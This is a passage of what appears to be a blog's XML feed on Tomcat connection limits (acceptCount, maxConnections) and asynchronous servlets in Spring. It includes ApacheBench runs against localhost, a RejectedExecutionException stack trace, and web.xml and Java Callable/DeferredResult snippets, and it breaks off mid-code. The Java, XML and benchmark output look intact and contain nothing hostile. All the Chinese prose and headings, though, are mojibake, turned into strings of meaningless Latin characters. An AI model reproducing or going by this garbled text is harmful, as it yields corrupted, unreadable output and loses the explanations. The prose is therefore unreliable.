<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>tomcatçš„<code>Acceptor</code>çº¿ç¨‹ä¼šä¸åœçš„ä»ç³»ç»Ÿçš„å…¨è¿æ¥é˜Ÿåˆ—é‡Œå»æ‹¿å¯¹åº”çš„socketè¿æ¥ï¼Œç›´åˆ°è¾¾åˆ°äº†<code>maxConnections</code>çš„å€¼ã€‚<br>ä¹‹å<code>Acceptor</code>ä¼šé˜»å¡åœ¨é‚£é‡Œï¼Œç›´åˆ°å¤„ç†çš„è¿æ¥å°äº<code>maxConnections</code>çš„å€¼ã€‚å¦‚æœä¸€ç›´é˜»å¡çš„è¯ï¼Œå°±ä¼šåœ¨ç³»ç»Ÿçš„tcp<br>è¿æ¥é˜Ÿåˆ—ä¸­é˜»å¡ï¼Œè¿™ä¸ªé˜Ÿåˆ—çš„é•¿åº¦æ˜¯<code>acceptCount</code>æ§åˆ¶çš„ï¼Œé»˜è®¤æ˜¯<code>100</code>ã€‚å¦‚æœä»ç„¶å¤„ç†ä¸è¿‡æ¥ï¼Œç³»ç»Ÿå¯èƒ½å°±ä¼šä¸¢æ‰<br>ä¸€äº›å»ºç«‹çš„è¿æ¥äº†ã€‚</p>
<p>æ‰€ä»¥ï¼Œå¤§è‡´å¯ä»¥ä¼°è®¡ä¸‹æœ€å¤šèƒ½å¤„ç†çš„è¿æ¥æ•°ï¼š</p>
<p><code>æœ€å¤§å¤„ç†è¿æ¥æ•° = acceptCount + maxConnection</code></p>
<p>#å‚è€ƒ</p>
<ol>
<li><p><a href="https://segmentfault.com/a/1190000008064162" rel="external nofollow noopener noreferrer" target="_blank">tomcatçš„acceptCountä¸maxConnections - xixicat - SegmentFault</a></p>
</li>
<li><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/config/http.html" rel="external nofollow noopener noreferrer" target="_blank">Apache Tomcat 7 Configuration Reference (7.0.77) - The HTTP Connector</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> connections </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å¼‚æ­¥ServletåŠSpringå¯¹å…¶çš„æ”¯æŒ]]></title>
      <url>http://qsli.github.io/2017/02/28/servlet-async/</url>
      <content type="html"><![CDATA[<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>é™å®š tomcatçš„è¿æ¥æ± ä¸ªæ•°ä¸º50ï¼Œå¹¶å‘ä¸º200ï¼ˆ&gt;&gt; çº¿ç¨‹æ± å¤§å°ï¼‰ï¼Œæ—¶å¼‚æ­¥å…·æœ‰å¾ˆå¤§çš„ä¼˜åŠ¿ã€‚</p>
<p>å¦‚æœå¹¶å‘é‡å°äºçº¿ç¨‹æ± å¤§å°ï¼Œå¼‚æ­¥çš„åå€’æ¯”åŒæ­¥çš„æ—¶é—´é•¿äº†å¾ˆä¹…ã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">maxThreads</span>=<span class="string">"50"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>å®Œæ•´çš„æµ‹è¯•ä»£ç åœ°å€ï¼š <a href="https://github.com/qsLI/Java_Tutorial/blob/master/web/src/main/java/com/air/async/AsyncRequestProcessor.java" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<h3 id="async-abæµ‹è¯•"><a href="#async-abæµ‹è¯•" class="headerlink" title="async abæµ‹è¯•"></a>async abæµ‹è¯•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$ ab -n 10000 -c 200 http://localhost:8080/async</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking localhost (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        Apache-Coyote/1.1</span><br><span class="line">Server Hostname:        localhost</span><br><span class="line">Server Port:            8080</span><br><span class="line"></span><br><span class="line">Document Path:          /async</span><br><span class="line">Document Length:        40 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200</span><br><span class="line">Time taken for tests:   1000.284 seconds</span><br><span class="line">Complete requests:      10000</span><br><span class="line">Failed requests:        47</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 47, Exceptions: 0)</span><br><span class="line">Write errors:           0</span><br><span class="line">Non-2xx responses:      47</span><br><span class="line">Total transferred:      1530740 bytes</span><br><span class="line">HTML transferred:       506980 bytes</span><br><span class="line">Requests per second:    10.00 [#/sec] (mean)</span><br><span class="line">Time per request:       20005.686 [ms] (mean)</span><br><span class="line">Time per request:       100.028 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          1.49 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    0   5.0      0     501</span><br><span class="line">Processing:     2 19810 1683.3  20001   20560</span><br><span class="line">Waiting:        1 19810 1683.4  20000   20558</span><br><span class="line">Total:          2 19811 1683.0  20001   20560</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%  20001</span><br><span class="line">  66%  20001</span><br><span class="line">  75%  20002</span><br><span class="line">  80%  20002</span><br><span class="line">  90%  20004</span><br><span class="line">  95%  20009</span><br><span class="line">  98%  20020</span><br><span class="line">  99%  20035</span><br><span class="line"> 100%  20560 (longest request)</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•è¿‡ç¨‹ä¸­å‡ºçš„å¼‚å¸¸ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ä¸€æœˆ 21, 2017 1:05:32 ä¸Šåˆ org.apache.catalina.core.StandardWrapperValve invoke</span><br><span class="line">ä¸¥é‡: Servlet.service() for servlet [com.air.async.AsyncServlet] in context with path [] threw exception</span><br><span class="line">java.util.concurrent.RejectedExecutionException: Task com.air.async.AsyncRequestProcessor@3caec762 rejected from java.util.concurrent.ThreadPoolExecutor@64db0f23[Running, pool size = 100, active threads = 100, queued tasks = 100, completed tasks = 9726]</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2048)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:821)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1372)</span><br><span class="line">  at com.air.async.AsyncServlet.doGet(AsyncServlet.java:25)</span><br><span class="line">  at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)</span><br><span class="line">  at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)</span><br><span class="line">  at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)</span><br><span class="line">  at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)</span><br><span class="line">  at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)</span><br><span class="line">  at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)</span><br><span class="line">  at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)</span><br><span class="line">  at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)</span><br><span class="line">  at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)</span><br><span class="line">  at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)</span><br><span class="line">  at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)</span><br><span class="line">  at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041)</span><br><span class="line">  at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:603)</span><br><span class="line">  at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2430)</span><br><span class="line">  at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2419)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">  at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>
<p>æœ‰47ä¸ªå¤±è´¥çš„caseï¼Œæ˜¯é˜Ÿåˆ—æ»¡äº†ï¼Œç„¶åä¸¢æ‰äº†è¯·æ±‚ã€‚</p>
<h3 id="sync-abæµ‹è¯•"><a href="#sync-abæµ‹è¯•" class="headerlink" title="sync abæµ‹è¯•"></a>sync abæµ‹è¯•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ ab -n 10000 -c 200 http://localhost:8080/hello</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking localhost (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        Apache-Coyote/1.1</span><br><span class="line">Server Hostname:        localhost</span><br><span class="line">Server Port:            8080</span><br><span class="line"></span><br><span class="line">Document Path:          /hello</span><br><span class="line">Document Length:        12 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200</span><br><span class="line">Time taken for tests:   2002.151 seconds</span><br><span class="line">Complete requests:      10000</span><br><span class="line">Failed requests:        0</span><br><span class="line">Write errors:           0</span><br><span class="line">Total transferred:      1340000 bytes</span><br><span class="line">HTML transferred:       120000 bytes</span><br><span class="line">Requests per second:    4.99 [#/sec] (mean)</span><br><span class="line">Time per request:       40043.028 [ms] (mean)</span><br><span class="line">Time per request:       200.215 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          0.65 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    0   0.4      0       8</span><br><span class="line">Processing: 10002 39740 2686.3  40005   50319</span><br><span class="line">Waiting:    10002 39740 2686.4  40004   50319</span><br><span class="line">Total:      10002 39741 2686.3  40005   50319</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%  40005</span><br><span class="line">  66%  40009</span><br><span class="line">  75%  40014</span><br><span class="line">  80%  40022</span><br><span class="line">  90%  40122</span><br><span class="line">  95%  40316</span><br><span class="line">  98%  40449</span><br><span class="line">  99%  40483</span><br><span class="line"> 100%  50319 (longest request)</span><br></pre></td></tr></table></figure>
<h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>å¼‚æ­¥çš„servleåœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨è¾ƒå°‘çš„è¿æ¥çº¿ç¨‹å®ç°è¾ƒå¤§çš„ååã€‚</p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Puts this request into asynchronous mode, and initializes its</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@link</span> AsyncContext&#125; with the original (unwrapped) ServletRequest</span></span><br><span class="line"><span class="comment">    * and ServletResponse objects.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Calling this method will cause committal of the associated</span></span><br><span class="line"><span class="comment">    * response to be delayed until &#123;<span class="doctag">@link</span> AsyncContext#complete&#125; is</span></span><br><span class="line"><span class="comment">    * called on the returned &#123;<span class="doctag">@link</span> AsyncContext&#125;, or the asynchronous</span></span><br><span class="line"><span class="comment">    * operation has timed out.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Calling &#123;<span class="doctag">@link</span> AsyncContext#hasOriginalRequestAndResponse()&#125; on</span></span><br><span class="line"><span class="comment">    * the returned AsyncContext will return &lt;code&gt;true&lt;/code&gt;. Any filters</span></span><br><span class="line"><span class="comment">    * invoked in the &lt;i&gt;outbound&lt;/i&gt; direction after this request was put</span></span><br><span class="line"><span class="comment">    * into asynchronous mode may use this as an indication that any request</span></span><br><span class="line"><span class="comment">    * and/or response wrappers that they added during their &lt;i&gt;inbound&lt;/i&gt;</span></span><br><span class="line"><span class="comment">    * invocation need not stay around for the duration of the asynchronous</span></span><br><span class="line"><span class="comment">    * operation, and therefore any of their associated resources may be</span></span><br><span class="line"><span class="comment">    * released.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;This method clears the list of &#123;<span class="doctag">@link</span> AsyncListener&#125; instances</span></span><br><span class="line"><span class="comment">    * (if any) that were registered with the AsyncContext returned by the</span></span><br><span class="line"><span class="comment">    * previous call to one of the startAsync methods, after calling each</span></span><br><span class="line"><span class="comment">    * AsyncListener at its &#123;<span class="doctag">@link</span> AsyncListener#onStartAsync onStartAsync&#125;</span></span><br><span class="line"><span class="comment">    * method.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Subsequent invocations of this method, or its overloaded </span></span><br><span class="line"><span class="comment">    * variant, will return the same AsyncContext instance, reinitialized</span></span><br><span class="line"><span class="comment">    * as appropriate.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the (re)initialized AsyncContext</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalStateException if this request is within the scope of</span></span><br><span class="line"><span class="comment">    * a filter or servlet that does not support asynchronous operations</span></span><br><span class="line"><span class="comment">    * (that is, &#123;<span class="doctag">@link</span> #isAsyncSupported&#125; returns false),</span></span><br><span class="line"><span class="comment">    * or if this method is called again without any asynchronous dispatch</span></span><br><span class="line"><span class="comment">    * (resulting from one of the &#123;<span class="doctag">@link</span> AsyncContext#dispatch&#125; methods),</span></span><br><span class="line"><span class="comment">    * is called outside the scope of any such dispatch, or is called again</span></span><br><span class="line"><span class="comment">    * within the scope of the same dispatch, or if the response has</span></span><br><span class="line"><span class="comment">    * already been closed</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> AsyncContext#dispatch()</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@since</span> Servlet 3.0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> AsyncContext <span class="title">startAsync</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException</span>;</span><br></pre></td></tr></table></figure>
<p>//æŒ–å‘ï¼Œå¾…å¡«</p>
<h2 id="Spring-å¯¹å¼‚æ­¥Servletçš„æ”¯æŒ"><a href="#Spring-å¯¹å¼‚æ­¥Servletçš„æ”¯æŒ" class="headerlink" title="Spring å¯¹å¼‚æ­¥Servletçš„æ”¯æŒ"></a>Spring å¯¹å¼‚æ­¥Servletçš„æ”¯æŒ</h2><p>web.xmlä¸­éœ€è¦çš„é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring encoding filter--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--servlet--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">            classpath:spring/mvc/mvc-app.xml</span><br><span class="line">        <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæœ‰filterçš„è¯ä¹Ÿå¿…é¡»é…ç½®ä¸Šå¼‚æ­¥çš„æ”¯æŒ</p>
<h3 id="Callable-æ–¹å¼"><a href="#Callable-æ–¹å¼" class="headerlink" title="Callable æ–¹å¼"></a>Callable æ–¹å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/async"</span>)</span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Callable&lt;String&gt; <span class="title">asyncProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ–¹å¼è¿”å›ä¸€ä¸ª<code>Callable</code>ï¼ŒSpringåœ¨çº¿ç¨‹æ± ä¸­æ‰§è¡Œ<code>Callable</code>å¹¶è·å–åˆ°ç»“æœç„¶åè¿›è¡Œåç»­çš„å¤„ç†ã€‚</p>
<p>TaskExecutor è‡ªå®šä¹‰çº¿ç¨‹æ± ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ================================== --&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- 0. Set up task executor for async  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ================================== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:async-support</span> <span class="attr">default-timeout</span>=<span class="string">"30000"</span> <span class="attr">task-executor</span>=<span class="string">"taskExecutor"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- modify the parameters of thread pool --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"taskExecutor"</span> <span class="attr">class</span>=<span class="string">"org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"corePoolSize"</span> <span class="attr">value</span>=<span class="string">"5"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"50"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"queueCapacity"</span> <span class="attr">value</span>=<span class="string">"10"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"keepAliveSeconds"</span> <span class="attr">value</span>=<span class="string">"120"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="DeferredResult-æ–¹å¼"><a href="#DeferredResult-æ–¹å¼" class="headerlink" title="DeferredResult æ–¹å¼"></a>DeferredResult æ–¹å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/asyncV2"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> DeferredResult&lt;String&gt; <span class="title">aysncProcess2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> DeferredResult&lt;String&gt; 